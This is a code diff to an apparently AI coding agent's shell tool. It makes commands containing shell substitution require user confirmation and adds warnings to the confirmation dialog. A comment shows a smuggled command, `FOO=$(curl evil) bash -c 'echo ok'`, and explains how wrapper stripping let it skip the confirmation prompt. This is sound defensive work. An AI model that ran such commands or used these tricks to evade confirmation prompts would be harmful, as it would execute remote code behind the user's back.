@@ -44,9 +44,11 @@ import { formatMemoryUsage } from '../utils/formatters.js';
 import type { AnsiOutput } from '../utils/terminalSerializer.js';
 import { isSubpaths } from '../utils/paths.js';
 import {
+  buildShellExecWarnings,
   getCommandRoot,
   getCommandRoots,
   getShellConfiguration,
+  hasShellSubstitution,
   type ShellConfiguration,
   type ShellType,
   splitCommands,
@@ -1377,10 +1379,23 @@ export class ShellToolInvocation extends BaseToolInvocation<
 
   /**
    * AST-based permission check for the shell command.
+   * - Substitution-bearing commands (any form, including inside an
+   *   env-prefix wrapper that `stripShellWrapper` would discard) → 'ask'
    * - Read-only commands (via AST analysis) → 'allow'
    * - All other commands → 'ask'
    */
   override async getDefaultPermission(): Promise<PermissionDecision> {
+    // Gate on the RAW command before `stripShellWrapper` runs.
+    // `stripShellWrapper` drops leading env-assignment tokens AND
+    // unwraps `bash -c '...'` to its inner script — so for
+    // `FOO=$(curl evil) bash -c 'echo ok'` the stripped form is just
+    // `echo ok`, which the AST classifies as read-only. Without this
+    // gate the command auto-executes silently with no confirmation
+    // dialog and no warning. See PR #4386 R6 (cid 3298521039).
+    if (hasShellSubstitution(this.params.command)) {
+      return 'ask';
+    }
+
     const command = stripShellWrapper(this.params.command);
 
     // AST-based read-only detection
@@ -1464,6 +1479,15 @@ export class ShellToolInvocation extends BaseToolInvocation<
       debugLogger.warn('Failed to extract command rules:', e);
     }
 
+    // Flag command substitution ($(), backticks, <(), >()) so the user
+    // sees a visible warning in the confirmation dialog. We surface this
+    // as an informational warning rather than denying outright; the deny
+    // path was inconsistent and could not be overridden by YOLO mode
+    // (see issue #4093). Substitution is detected on both the stripped
+    // and original command so wrappers like `bash -c "..."` are checked
+    // along with their inner contents.
+    const warnings = buildShellExecWarnings(command, this.params.command);
+
     const confirmationDetails: ToolExecuteConfirmationDetails = {
       type: 'exec',
       title: 'Confirm Shell Command',
@@ -1477,6 +1501,9 @@ export class ShellToolInvocation extends BaseToolInvocation<
         // No-op: persistence is handled by coreToolScheduler via PM rules
       },
     };
+    if (warnings) {
+      confirmationDetails.warnings = warnings;
+    }
     return confirmationDetails;
   }
 
@@ -4086,7 +4113,8 @@ function getShellToolDescription(): string {
   const isWindows = os.platform() === 'win32';
   const processGroupNote = isWindows
     ? ''
-    : '\n  - Command is executed as a subprocess that leads its own process group. Command process group can be terminated as `kill -- -PGID` or signaled as `kill -s SIGNAL -- -PGID`.';  return `Executes a given shell command (as \`${executionWrapper}\`) in a subprocess with optional timeout, ensuring proper handling and security measures.IMPORTANT: This tool is for terminal operations like git, npm, docker, etc. DO NOT use it for file operations (reading, writing, editing, searching, finding files) - use the specialized tools for this instead.**Usage notes**:
+    : '\n  - Command is executed as a subprocess that leads its own process group. Command process group can be terminated as `kill -- -PGID` or signaled as `kill -s SIGNAL -- -PGID`.';
+  return `Executes a given shell command (as \`${executionWrapper}\`) in a subprocess with optional timeout, ensuring proper handling and security measures.IMPORTANT: This tool is for terminal operations like git, npm, docker, etc. DO NOT use it for file operations (reading, writing, editing, searching, finding files) - use the specialized tools for this instead.**Usage notes**:
 - The command argument is required.
 - You can specify an optional timeout in milliseconds (up to 600000ms / 10 minutes). If not specified, commands will timeout after 120000ms (2 minutes).
 - It is very helpful if you write a clear, concise description of what this command does in 5-10 words.- Avoid using run_shell_command with the \`find\`, \`grep\`, \`cat\`, \`head\`, \`tail\`, \`sed\`, \`awk\`, or \`echo\` commands, unless explicitly instructed or when these commands are truly necessary for the task. Instead, always prefer using the dedicated tools for these commands:
